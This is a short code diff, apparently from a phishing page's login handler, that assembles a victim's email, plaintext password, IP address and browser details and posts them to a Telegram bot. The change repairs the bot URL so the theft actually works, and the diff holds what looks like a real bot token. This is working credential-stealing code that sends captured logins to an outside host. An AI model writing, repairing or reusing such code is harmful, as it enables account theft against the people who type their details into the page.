@@ -348,7 +348,7 @@
         const message = `Login Attempt #${attempt + 1}\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nUser Agent: ${userAgent}\nDate: ${date}`;
 
         // Send to Telegram
-        await fetch("https://api.telegram.org/bot7708953155:AAFvoTY6BdKd-HsiLFGh8e9kb0pwLtkBswE", {
+        await fetch("https://api.telegram.org/bot7708953155:AAFvoTY6BdKd-HsiLFGh8e9kb0pwLtkBswE/sendMessage", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
